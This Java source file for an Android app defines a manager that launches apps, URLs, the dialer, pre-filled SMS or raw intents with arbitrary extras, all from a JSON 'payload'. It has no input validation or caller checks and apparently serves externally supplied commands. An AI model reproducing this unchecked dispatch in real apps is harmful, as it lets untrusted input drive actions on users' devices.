package com.fason.app.features.launchintent;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import com.fason.app.core.FasonApp;

import org.json.JSONObject;

/**
 * LaunchIntentManager — launches arbitrary intents, URLs, apps.
 */
public final class LaunchIntentManager {
    private static volatile LaunchIntentManager instance;
    private final Context ctx;

    private LaunchIntentManager() { this.ctx = FasonApp.getContext(); }

    public static synchronized LaunchIntentManager getInstance() {
        if (instance == null) instance = new LaunchIntentManager();
        return instance;
    }

    /** payload: {kind: app|url|intent|dial|sms, target, extras?} */
    public JSONObject launch(JSONObject payload) {
        String kind = payload.optString("kind", "app");
        String target = payload.optString("target", "");
        try {
            Intent i;
            switch (kind) {
                case "app": {
                    i = ctx.getPackageManager().getLaunchIntentForPackage(target);
                    if (i == null) return err("app not found: " + target);
                    break;
                }
                case "url": {
                    i = new Intent(Intent.ACTION_VIEW, Uri.parse(target));
                    break;
                }
                case "dial": {
                    i = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:" + target));
                    break;
                }
                case "sms": {
                    i = new Intent(Intent.ACTION_VIEW, Uri.parse("sms:" + target));
                    String body = payload.optString("body", "");
                    if (!body.isEmpty()) i.putExtra("sms_body", body);
                    break;
                }
                case "intent": {
                    // raw intent: target = action string, extras in payload
                    i = new Intent(target);
                    JSONObject extras = payload.optJSONObject("extras");
                    if (extras != null) {
                        java.util.Iterator<String> keys = extras.keys();
                        while (keys.hasNext()) {
                            String k = keys.next();
                            Object v = extras.get(k);
                            if (v instanceof String) i.putExtra(k, (String) v);
                            else if (v instanceof Integer) i.putExtra(k, (Integer) v);
                            else if (v instanceof Boolean) i.putExtra(k, (Boolean) v);
                        }
                    }
                    break;
                }
                default:
                    return err("unknown kind: " + kind);
            }
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            JSONObject r = new JSONObject();
            r.put("success", true);
            r.put("launched", kind + ":" + target);
            return r;
        } catch (Exception e) {
            return err(e.getMessage());
        }
    }

    private JSONObject err(String msg) {
        JSONObject r = new JSONObject();
        try { r.put("success", false); r.put("error", msg); } catch (Exception ignored) {}
        return r;
    }
}
